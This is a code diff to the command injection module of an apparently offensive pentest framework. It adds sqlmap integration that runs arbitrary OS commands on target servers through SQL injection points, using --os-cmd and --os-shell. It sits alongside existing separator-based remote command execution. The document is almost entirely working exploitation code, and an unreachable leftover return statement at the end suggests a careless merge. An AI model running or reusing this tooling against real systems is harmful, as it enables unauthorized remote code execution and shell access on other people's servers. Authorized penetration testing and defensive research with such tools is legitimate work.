@@ -3,10 +3,16 @@
 """
 ATOMIC FRAMEWORK - Command Injection Module
 OS Command Injection detection and exploitation
+
+Includes native detection techniques and optional sqlmap integration
+for OS command execution via confirmed SQL injection points.
 """
 
 import os
 import re
+import shutil
+import subprocess
+import tempfile
 import time
 
 
@@ -71,6 +77,10 @@ class CommandInjectionModule:
         
         # Test environment variable injection
         self._test_env_injection(url, method, param, value)
+
+        # sqlmap OS command execution (optional, requires sqlmap installed)
+        if self.engine.config.get('modules', {}).get('sqlmap', False):
+            self._test_sqlmap_os(url, method, param, value)
     
     def _test_oob_cmdi(self, url: str, method: str, param: str, value: str):
         """Test OOB command injection"""
@@ -283,7 +293,12 @@ class CommandInjectionModule:
                     print(f"{Colors.error(f'Separator test error: {e}')}")
     
     def exploit_execute(self, url: str, param: str, command: str, method: str = 'GET') -> str:
-        """Execute command via RCE"""
+        """Execute command via RCE.
+
+        Tries native separator-based command injection first; falls back
+        to sqlmap ``--os-cmd`` when the ``sqlmap`` module flag is enabled.
+        """
+        # Native separator-based execution
         separators = [';', '|', '&&', '||', '`']
         
         for sep in separators:
@@ -296,6 +311,178 @@ class CommandInjectionModule:
                     return response.text
             except Exception as e:
                 print(f"{Colors.error(f'Command execution error: {e}')}")
+
+        # Fallback to sqlmap --os-cmd if native injection didn't return
+        if self.engine.config.get('modules', {}).get('sqlmap', False):
+            result = self.sqlmap_os_cmd(url, param, command, method=method)
+            if result:
+                return result
+
+        return None
+
+    # ------------------------------------------------------------------
+    # sqlmap CLI integration for OS command execution
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _find_sqlmap() -> str:
+        """Return the sqlmap executable path or empty string if not found."""
+        path = shutil.which('sqlmap')
+        if path:
+            return path
+        for candidate in [
+            '/usr/bin/sqlmap', '/usr/local/bin/sqlmap',
+            '/usr/share/sqlmap/sqlmap.py',
+            os.path.expanduser('~/.local/bin/sqlmap'),
+            os.path.expanduser('~/sqlmap/sqlmap.py'),
+            '/opt/sqlmap/sqlmap.py',
+        ]:
+            if os.path.isfile(candidate):
+                return candidate
+        return ''
+
+    def _test_sqlmap_os(self, url: str, method: str, param: str, value: str):
+        """Probe for OS command execution via sqlmap's --os-cmd.
+
+        Uses ``id`` (Unix) as the probe command.  If sqlmap succeeds in
+        executing it the result is registered as a CRITICAL finding.
+        """
+        sqlmap_bin = self._find_sqlmap()
+        if not sqlmap_bin:
+            if self.engine.config.get('verbose'):
+                print(f"{Colors.warning('sqlmap not found — skipping OS command test')}")
+            return
+
+        result = self.sqlmap_os_cmd(
+            url, param, 'id', method=method, value=value,
+            sqlmap_bin=sqlmap_bin,
+        )
+        if result and re.search(r'uid=\d+', result):
+            from core.engine import Finding
+            finding = Finding(
+                technique="Command Injection (sqlmap --os-cmd)",
+                url=url,
+                severity='CRITICAL',
+                confidence=0.95,
+                param=param,
+                payload='id',
+                evidence=f"sqlmap OS command output: {result[:200]}",
+            )
+            self.engine.add_finding(finding)
+
+    def sqlmap_os_cmd(self, url: str, param: str, command: str, *,
+                      method: str = 'GET', value: str = '',
+                      sqlmap_bin: str = '',
+                      timeout: int = 120) -> str:
+        """Execute an OS command via sqlmap's ``--os-cmd`` feature.
+
+        Parameters
+        ----------
+        url : str
+            Target URL.
+        param : str
+            Vulnerable parameter name.
+        command : str
+            OS command to execute.
+        method : str
+            HTTP method.
+        value : str
+            Current parameter value.
+        sqlmap_bin : str
+            Path to sqlmap binary (auto-detected if empty).
+        timeout : int
+            Maximum seconds to wait.
+
+        Returns
+        -------
+        str
+            Command output or empty string on failure.
+        """
+        if not sqlmap_bin:
+            sqlmap_bin = self._find_sqlmap()
+        if not sqlmap_bin:
+            return ''
+
+        try:
+            if method.upper() == 'GET':
+                separator = '&' if '?' in url else '?'
+                target_url = f"{url}{separator}{param}={value}"
+                cmd = [sqlmap_bin, '-u', target_url, '-p', param]
+            else:
+                cmd = [
+                    sqlmap_bin, '-u', url,
+                    '--data', f'{param}={value}',
+                    '-p', param,
+                ]
+
+            cmd.extend(['--batch', '--os-cmd', command])
+
+            if sqlmap_bin.endswith('.py'):
+                cmd = ['python3', *cmd]
+
+            proc = subprocess.run(
+                cmd, capture_output=True, text=True, timeout=timeout,
+            )
+
+            # Extract command output from sqlmap stdout
+            output_lines = []
+            capture = False
+            for line in proc.stdout.splitlines():
+                if 'command standard output' in line.lower():
+                    capture = True
+                    continue
+                if capture:
+                    if line.strip() == '---':
+                        break
+                    output_lines.append(line)
+
+            return '\n'.join(output_lines).strip() if output_lines else ''
+
+        except subprocess.TimeoutExpired:
+            return ''
+        except Exception as e:
+            if self.engine.config.get('verbose'):
+                print(f"{Colors.error(f'sqlmap OS cmd error: {e}')}")
+            return ''
+
+    def sqlmap_os_shell_interactive(self, url: str, param: str, *,
+                                    method: str = 'GET', value: str = '',
+                                    timeout: int = 300) -> str:
+        """Attempt to get an interactive OS shell via sqlmap.
+
+        Returns the sqlmap process output.  In practice, interactive mode
+        is hard to automate so this wraps ``--os-shell`` with ``--batch``.
+        """
+        sqlmap_bin = self._find_sqlmap()
+        if not sqlmap_bin:
+            return ''
+
+        try:
+            if method.upper() == 'GET':
+                separator = '&' if '?' in url else '?'
+                target_url = f"{url}{separator}{param}={value}"
+                cmd = [sqlmap_bin, '-u', target_url, '-p', param]
+            else:
+                cmd = [
+                    sqlmap_bin, '-u', url,
+                    '--data', f'{param}={value}',
+                    '-p', param,
+                ]
+
+            cmd.extend(['--batch', '--os-shell'])
+
+            if sqlmap_bin.endswith('.py'):
+                cmd = ['python3', *cmd]
+
+            proc = subprocess.run(
+                cmd, capture_output=True, text=True, timeout=timeout,
+            )
+            return proc.stdout
+
+        except subprocess.TimeoutExpired:
+            return ''
+        except Exception:
+            return ''
         
         return None
     
